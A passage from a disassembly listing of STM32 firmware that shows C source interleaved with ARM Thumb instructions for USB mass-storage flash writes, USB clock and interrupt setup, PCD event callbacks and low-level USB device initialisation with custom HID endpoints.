  return (USBD_FAIL);
 800c9f6:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c9f8:	4618      	mov	r0, r3
 800c9fa:	3710      	adds	r7, #16
 800c9fc:	46bd      	mov	sp, r7
 800c9fe:	bd80      	pop	{r7, pc}

0800ca00 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800ca00:	b580      	push	{r7, lr}
 800ca02:	b08a      	sub	sp, #40	; 0x28
 800ca04:	af00      	add	r7, sp, #0
 800ca06:	60b9      	str	r1, [r7, #8]
 800ca08:	607a      	str	r2, [r7, #4]
 800ca0a:	461a      	mov	r2, r3
 800ca0c:	4603      	mov	r3, r0
 800ca0e:	73fb      	strb	r3, [r7, #15]
 800ca10:	4613      	mov	r3, r2
 800ca12:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800ca14:	7bfb      	ldrb	r3, [r7, #15]
 800ca16:	2b00      	cmp	r3, #0
 800ca18:	d136      	bne.n	800ca88 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800ca1a:	f7f4 febb 	bl	8001794 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800ca1e:	2300      	movs	r3, #0
 800ca20:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800ca22:	2301      	movs	r3, #1
 800ca24:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800ca26:	687b      	ldr	r3, [r7, #4]
 800ca28:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800ca2c:	3340      	adds	r3, #64	; 0x40
 800ca2e:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800ca32:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800ca34:	89bb      	ldrh	r3, [r7, #12]
 800ca36:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800ca38:	2300      	movs	r3, #0
 800ca3a:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800ca3c:	f107 0210 	add.w	r2, r7, #16
 800ca40:	f107 0314 	add.w	r3, r7, #20
 800ca44:	4611      	mov	r1, r2
 800ca46:	4618      	mov	r0, r3
 800ca48:	f7f4 ff8a 	bl	8001960 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800ca4c:	2300      	movs	r3, #0
 800ca4e:	84fb      	strh	r3, [r7, #38]	; 0x26
 800ca50:	e011      	b.n	800ca76 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800ca52:	687b      	ldr	r3, [r7, #4]
 800ca54:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800ca58:	3340      	adds	r3, #64	; 0x40
 800ca5a:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800ca5c:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca5e:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800ca60:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca62:	68ba      	ldr	r2, [r7, #8]
 800ca64:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800ca66:	e9d3 2300 	ldrd	r2, r3, [r3]
 800ca6a:	2000      	movs	r0, #0
 800ca6c:	f7f4 fe26 	bl	80016bc <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800ca70:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca72:	3308      	adds	r3, #8
 800ca74:	84fb      	strh	r3, [r7, #38]	; 0x26
 800ca76:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800ca78:	89bb      	ldrh	r3, [r7, #12]
 800ca7a:	02db      	lsls	r3, r3, #11
 800ca7c:	429a      	cmp	r2, r3
 800ca7e:	d3e8      	bcc.n	800ca52 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800ca80:	f7f4 feaa 	bl	80017d8 <HAL_FLASH_Lock>
		return USBD_OK;
 800ca84:	2300      	movs	r3, #0
 800ca86:	e000      	b.n	800ca8a <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800ca88:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800ca8a:	4618      	mov	r0, r3
 800ca8c:	3728      	adds	r7, #40	; 0x28
 800ca8e:	46bd      	mov	sp, r7
 800ca90:	bd80      	pop	{r7, pc}

0800ca92 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800ca92:	b480      	push	{r7}
 800ca94:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800ca96:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800ca98:	4618      	mov	r0, r3
 800ca9a:	46bd      	mov	sp, r7
 800ca9c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800caa0:	4770      	bx	lr
	...

0800caa4 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800caa4:	b580      	push	{r7, lr}
 800caa6:	b098      	sub	sp, #96	; 0x60
 800caa8:	af00      	add	r7, sp, #0
 800caaa:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800caac:	f107 030c 	add.w	r3, r7, #12
 800cab0:	2254      	movs	r2, #84	; 0x54
 800cab2:	2100      	movs	r1, #0
 800cab4:	4618      	mov	r0, r3
 800cab6:	f000 fbd5 	bl	800d264 <memset>
  if(pcdHandle->Instance==USB)
 800caba:	687b      	ldr	r3, [r7, #4]
 800cabc:	681b      	ldr	r3, [r3, #0]
 800cabe:	4a1d      	ldr	r2, [pc, #116]	; (800cb34 <HAL_PCD_MspInit+0x90>)
 800cac0:	4293      	cmp	r3, r2
 800cac2:	d132      	bne.n	800cb2a <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800cac4:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800cac8:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800caca:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800cace:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800cad0:	2301      	movs	r3, #1
 800cad2:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800cad4:	2301      	movs	r3, #1
 800cad6:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800cad8:	2318      	movs	r3, #24
 800cada:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800cadc:	2307      	movs	r3, #7
 800cade:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800cae0:	2302      	movs	r3, #2
 800cae2:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800cae4:	2302      	movs	r3, #2
 800cae6:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800cae8:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800caec:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800caee:	f107 030c 	add.w	r3, r7, #12
 800caf2:	4618      	mov	r0, r3
 800caf4:	f7f7 fe5c 	bl	80047b0 <HAL_RCCEx_PeriphCLKConfig>
 800caf8:	4603      	mov	r3, r0
 800cafa:	2b00      	cmp	r3, #0
 800cafc:	d001      	beq.n	800cb02 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800cafe:	f7f4 fa03 	bl	8000f08 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800cb02:	4b0d      	ldr	r3, [pc, #52]	; (800cb38 <HAL_PCD_MspInit+0x94>)
 800cb04:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800cb06:	4a0c      	ldr	r2, [pc, #48]	; (800cb38 <HAL_PCD_MspInit+0x94>)
 800cb08:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800cb0c:	6593      	str	r3, [r2, #88]	; 0x58
 800cb0e:	4b0a      	ldr	r3, [pc, #40]	; (800cb38 <HAL_PCD_MspInit+0x94>)
 800cb10:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800cb12:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800cb16:	60bb      	str	r3, [r7, #8]
 800cb18:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800cb1a:	2200      	movs	r2, #0
 800cb1c:	2100      	movs	r1, #0
 800cb1e:	2043      	movs	r0, #67	; 0x43
 800cb20:	f7f4 fd95 	bl	800164e <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800cb24:	2043      	movs	r0, #67	; 0x43
 800cb26:	f7f4 fdae 	bl	8001686 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800cb2a:	bf00      	nop
 800cb2c:	3760      	adds	r7, #96	; 0x60
 800cb2e:	46bd      	mov	sp, r7
 800cb30:	bd80      	pop	{r7, pc}
 800cb32:	bf00      	nop
 800cb34:	40006800 	.word	0x40006800
 800cb38:	40021000 	.word	0x40021000

0800cb3c <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb3c:	b580      	push	{r7, lr}
 800cb3e:	b082      	sub	sp, #8
 800cb40:	af00      	add	r7, sp, #0
 800cb42:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800cb44:	687b      	ldr	r3, [r7, #4]
 800cb46:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800cb4a:	687b      	ldr	r3, [r7, #4]
 800cb4c:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800cb50:	4619      	mov	r1, r3
 800cb52:	4610      	mov	r0, r2
 800cb54:	f7fe fb70 	bl	800b238 <USBD_LL_SetupStage>
}
 800cb58:	bf00      	nop
 800cb5a:	3708      	adds	r7, #8
 800cb5c:	46bd      	mov	sp, r7
 800cb5e:	bd80      	pop	{r7, pc}

0800cb60 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb60:	b580      	push	{r7, lr}
 800cb62:	b082      	sub	sp, #8
 800cb64:	af00      	add	r7, sp, #0
 800cb66:	6078      	str	r0, [r7, #4]
 800cb68:	460b      	mov	r3, r1
 800cb6a:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800cb6c:	687b      	ldr	r3, [r7, #4]
 800cb6e:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800cb72:	78fa      	ldrb	r2, [r7, #3]
 800cb74:	6879      	ldr	r1, [r7, #4]
 800cb76:	4613      	mov	r3, r2
 800cb78:	009b      	lsls	r3, r3, #2
 800cb7a:	4413      	add	r3, r2
 800cb7c:	00db      	lsls	r3, r3, #3
 800cb7e:	440b      	add	r3, r1
 800cb80:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800cb84:	681a      	ldr	r2, [r3, #0]
 800cb86:	78fb      	ldrb	r3, [r7, #3]
 800cb88:	4619      	mov	r1, r3
 800cb8a:	f7fe fbaa 	bl	800b2e2 <USBD_LL_DataOutStage>
}
 800cb8e:	bf00      	nop
 800cb90:	3708      	adds	r7, #8
 800cb92:	46bd      	mov	sp, r7
 800cb94:	bd80      	pop	{r7, pc}

0800cb96 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb96:	b580      	push	{r7, lr}
 800cb98:	b082      	sub	sp, #8
 800cb9a:	af00      	add	r7, sp, #0
 800cb9c:	6078      	str	r0, [r7, #4]
 800cb9e:	460b      	mov	r3, r1
 800cba0:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800cba2:	687b      	ldr	r3, [r7, #4]
 800cba4:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800cba8:	78fa      	ldrb	r2, [r7, #3]
 800cbaa:	6879      	ldr	r1, [r7, #4]
 800cbac:	4613      	mov	r3, r2
 800cbae:	009b      	lsls	r3, r3, #2
 800cbb0:	4413      	add	r3, r2
 800cbb2:	00db      	lsls	r3, r3, #3
 800cbb4:	440b      	add	r3, r1
 800cbb6:	333c      	adds	r3, #60	; 0x3c
 800cbb8:	681a      	ldr	r2, [r3, #0]
 800cbba:	78fb      	ldrb	r3, [r7, #3]
 800cbbc:	4619      	mov	r1, r3
 800cbbe:	f7fe fc43 	bl	800b448 <USBD_LL_DataInStage>
}
 800cbc2:	bf00      	nop
 800cbc4:	3708      	adds	r7, #8
 800cbc6:	46bd      	mov	sp, r7
 800cbc8:	bd80      	pop	{r7, pc}

0800cbca <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cbca:	b580      	push	{r7, lr}
 800cbcc:	b082      	sub	sp, #8
 800cbce:	af00      	add	r7, sp, #0
 800cbd0:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800cbd2:	687b      	ldr	r3, [r7, #4]
 800cbd4:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbd8:	4618      	mov	r0, r3
 800cbda:	f7fe fd7d 	bl	800b6d8 <USBD_LL_SOF>
}
 800cbde:	bf00      	nop
 800cbe0:	3708      	adds	r7, #8
 800cbe2:	46bd      	mov	sp, r7
 800cbe4:	bd80      	pop	{r7, pc}

0800cbe6 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cbe6:	b580      	push	{r7, lr}
 800cbe8:	b084      	sub	sp, #16
 800cbea:	af00      	add	r7, sp, #0
 800cbec:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800cbee:	2301      	movs	r3, #1
 800cbf0:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800cbf2:	687b      	ldr	r3, [r7, #4]
 800cbf4:	689b      	ldr	r3, [r3, #8]
 800cbf6:	2b02      	cmp	r3, #2
 800cbf8:	d001      	beq.n	800cbfe <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800cbfa:	f7f4 f985 	bl	8000f08 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800cbfe:	687b      	ldr	r3, [r7, #4]
 800cc00:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cc04:	7bfa      	ldrb	r2, [r7, #15]
 800cc06:	4611      	mov	r1, r2
 800cc08:	4618      	mov	r0, r3
 800cc0a:	f7fe fd21 	bl	800b650 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800cc0e:	687b      	ldr	r3, [r7, #4]
 800cc10:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cc14:	4618      	mov	r0, r3
 800cc16:	f7fe fcc9 	bl	800b5ac <USBD_LL_Reset>
}
 800cc1a:	bf00      	nop
 800cc1c:	3710      	adds	r7, #16
 800cc1e:	46bd      	mov	sp, r7
 800cc20:	bd80      	pop	{r7, pc}
	...

0800cc24 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cc24:	b580      	push	{r7, lr}
 800cc26:	b082      	sub	sp, #8
 800cc28:	af00      	add	r7, sp, #0
 800cc2a:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800cc2c:	687b      	ldr	r3, [r7, #4]
 800cc2e:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cc32:	4618      	mov	r0, r3
 800cc34:	f7fe fd1c 	bl	800b670 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800cc38:	687b      	ldr	r3, [r7, #4]
 800cc3a:	699b      	ldr	r3, [r3, #24]
 800cc3c:	2b00      	cmp	r3, #0
 800cc3e:	d005      	beq.n	800cc4c <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cc40:	4b04      	ldr	r3, [pc, #16]	; (800cc54 <HAL_PCD_SuspendCallback+0x30>)
 800cc42:	691b      	ldr	r3, [r3, #16]
 800cc44:	4a03      	ldr	r2, [pc, #12]	; (800cc54 <HAL_PCD_SuspendCallback+0x30>)
 800cc46:	f043 0306 	orr.w	r3, r3, #6
 800cc4a:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800cc4c:	bf00      	nop
 800cc4e:	3708      	adds	r7, #8
 800cc50:	46bd      	mov	sp, r7
 800cc52:	bd80      	pop	{r7, pc}
 800cc54:	e000ed00 	.word	0xe000ed00

0800cc58 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cc58:	b580      	push	{r7, lr}
 800cc5a:	b082      	sub	sp, #8
 800cc5c:	af00      	add	r7, sp, #0
 800cc5e:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800cc60:	687b      	ldr	r3, [r7, #4]
 800cc62:	699b      	ldr	r3, [r3, #24]
 800cc64:	2b00      	cmp	r3, #0
 800cc66:	d007      	beq.n	800cc78 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cc68:	4b08      	ldr	r3, [pc, #32]	; (800cc8c <HAL_PCD_ResumeCallback+0x34>)
 800cc6a:	691b      	ldr	r3, [r3, #16]
 800cc6c:	4a07      	ldr	r2, [pc, #28]	; (800cc8c <HAL_PCD_ResumeCallback+0x34>)
 800cc6e:	f023 0306 	bic.w	r3, r3, #6
 800cc72:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800cc74:	f000 faf0 	bl	800d258 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800cc78:	687b      	ldr	r3, [r7, #4]
 800cc7a:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cc7e:	4618      	mov	r0, r3
 800cc80:	f7fe fd12 	bl	800b6a8 <USBD_LL_Resume>
}
 800cc84:	bf00      	nop
 800cc86:	3708      	adds	r7, #8
 800cc88:	46bd      	mov	sp, r7
 800cc8a:	bd80      	pop	{r7, pc}
 800cc8c:	e000ed00 	.word	0xe000ed00

0800cc90 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800cc90:	b580      	push	{r7, lr}
 800cc92:	b082      	sub	sp, #8
 800cc94:	af00      	add	r7, sp, #0
 800cc96:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800cc98:	f7f6 ff42 	bl	8003b20 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800cc9c:	4a26      	ldr	r2, [pc, #152]	; (800cd38 <USBD_LL_Init+0xa8>)
 800cc9e:	687b      	ldr	r3, [r7, #4]
 800cca0:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800cca4:	687b      	ldr	r3, [r7, #4]
 800cca6:	4a24      	ldr	r2, [pc, #144]	; (800cd38 <USBD_LL_Init+0xa8>)
 800cca8:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800ccac:	4b22      	ldr	r3, [pc, #136]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccae:	4a23      	ldr	r2, [pc, #140]	; (800cd3c <USBD_LL_Init+0xac>)
 800ccb0:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ccb2:	4b21      	ldr	r3, [pc, #132]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccb4:	2208      	movs	r2, #8
 800ccb6:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ccb8:	4b1f      	ldr	r3, [pc, #124]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccba:	2202      	movs	r2, #2
 800ccbc:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ccbe:	4b1e      	ldr	r3, [pc, #120]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccc0:	2202      	movs	r2, #2
 800ccc2:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ccc4:	4b1c      	ldr	r3, [pc, #112]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccc6:	2200      	movs	r2, #0
 800ccc8:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ccca:	4b1b      	ldr	r3, [pc, #108]	; (800cd38 <USBD_LL_Init+0xa8>)
 800cccc:	2200      	movs	r2, #0
 800ccce:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ccd0:	4b19      	ldr	r3, [pc, #100]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccd2:	2200      	movs	r2, #0
 800ccd4:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800ccd6:	4b18      	ldr	r3, [pc, #96]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccd8:	2200      	movs	r2, #0
 800ccda:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800ccdc:	4816      	ldr	r0, [pc, #88]	; (800cd38 <USBD_LL_Init+0xa8>)
 800ccde:	f7f5 f8e7 	bl	8001eb0 <HAL_PCD_Init>
 800cce2:	4603      	mov	r3, r0
 800cce4:	2b00      	cmp	r3, #0
 800cce6:	d001      	beq.n	800ccec <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cce8:	f7f4 f90e 	bl	8000f08 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800ccec:	687b      	ldr	r3, [r7, #4]
 800ccee:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ccf2:	2318      	movs	r3, #24
 800ccf4:	2200      	movs	r2, #0
 800ccf6:	2100      	movs	r1, #0
 800ccf8:	f7f6 fe31 	bl	800395e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ccfc:	687b      	ldr	r3, [r7, #4]
 800ccfe:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd02:	2358      	movs	r3, #88	; 0x58
 800cd04:	2200      	movs	r2, #0
 800cd06:	2180      	movs	r1, #128	; 0x80
 800cd08:	f7f6 fe29 	bl	800395e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800cd0c:	687b      	ldr	r3, [r7, #4]
 800cd0e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd12:	2398      	movs	r3, #152	; 0x98
 800cd14:	2200      	movs	r2, #0
 800cd16:	2181      	movs	r1, #129	; 0x81
 800cd18:	f7f6 fe21 	bl	800395e <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800cd1c:	687b      	ldr	r3, [r7, #4]
 800cd1e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd22:	23d8      	movs	r3, #216	; 0xd8
 800cd24:	2200      	movs	r2, #0
 800cd26:	2101      	movs	r1, #1
 800cd28:	f7f6 fe19 	bl	800395e <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800cd2c:	2300      	movs	r3, #0
}
 800cd2e:	4618      	mov	r0, r3
 800cd30:	3708      	adds	r7, #8
 800cd32:	46bd      	mov	sp, r7
 800cd34:	bd80      	pop	{r7, pc}
 800cd36:	bf00      	nop
 800cd38:	20000b7c 	.word	0x20000b7c
 800cd3c:	40006800 	.word	0x40006800

0800cd40 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cd40:	b580      	push	{r7, lr}
 800cd42:	b084      	sub	sp, #16
 800cd44:	af00      	add	r7, sp, #0
 800cd46:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd48:	2300      	movs	r3, #0
 800cd4a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd4c:	2300      	movs	r3, #0
 800cd4e:	73fb      	strb	r3, [r7, #15]

